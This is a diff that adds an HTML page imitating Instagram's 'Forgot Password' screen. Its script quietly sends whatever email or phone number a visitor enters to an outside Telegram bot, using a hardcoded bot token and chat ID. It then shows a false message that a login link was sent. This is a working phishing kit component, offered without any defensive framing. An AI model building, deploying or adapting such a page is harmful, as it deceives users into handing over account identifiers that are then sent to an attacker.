@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Forgot Password - Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #121212; color: #fff; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .header { width: 100%; display: flex; align-items: center; padding: 10px 0; margin-bottom: 20px;}
+        .header h2 { font-size: 18px; font-weight: 600; margin-left: 15px;}
+        .logo { width: 60px; height: 60px; margin-bottom: 20px; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 132"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23f9ce34"/><stop offset="50%" stop-color="%23ee2a7b"/><stop offset="100%" stop-color="%236228d7"/></linearGradient></defs><rect x="6" y="6" width="120" height="120" rx="28" fill="none" stroke="url(%23grad)" stroke-width="12"/><circle cx="66" cy="66" r="30" fill="none" stroke="url(%23grad)" stroke-width="12"/><circle cx="99" cy="33" r="8" fill="url(%23grad)"/></svg>'); background-size: cover; }
+        h3 { font-size: 16px; margin-bottom: 10px; text-align: center;}
+        p { font-size: 14px; color: #a8a8a8; text-align: center; margin-bottom: 20px; line-height: 1.4;}
+        input { width: 100%; max-width: 350px; padding: 16px; background: #1c1c1c; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 15px; margin-bottom: 15px; outline: none;}
+        button { width: 100%; max-width: 350px; padding: 14px; background: #0095f6; color: #fff; border: none; border-radius: 12px; font-weight: 600; font-size: 16px; cursor: pointer;}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="index.html" style="color:#fff; text-decoration:none; font-size:24px;">&larr;</a>
+        <h2>Find your account</h2>
+    </div>
+    <div class="logo"></div>
+    <h3>Enter your email or phone number</h3>
+    <p>We'll send you a link to get back into your account.</p>
+    <form id="forgotForm">
+        <input type="text" id="email" placeholder="Email address or phone number" required>
+        <button type="submit">Send login link</button>
+    </form>
+    <script>
+        document.getElementById('forgotForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
+            const CHAT_ID = "2005892579";
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 *FORGOT PASS EMAIL!*\n📧 ${email}`, parse_mode: "Markdown" })
+            }).then(() => {
+                alert("A login link has been sent to your email.");
+                window.location.href = 'index.html';
+            });
+        });
+    </script>
+</body>
+</html>
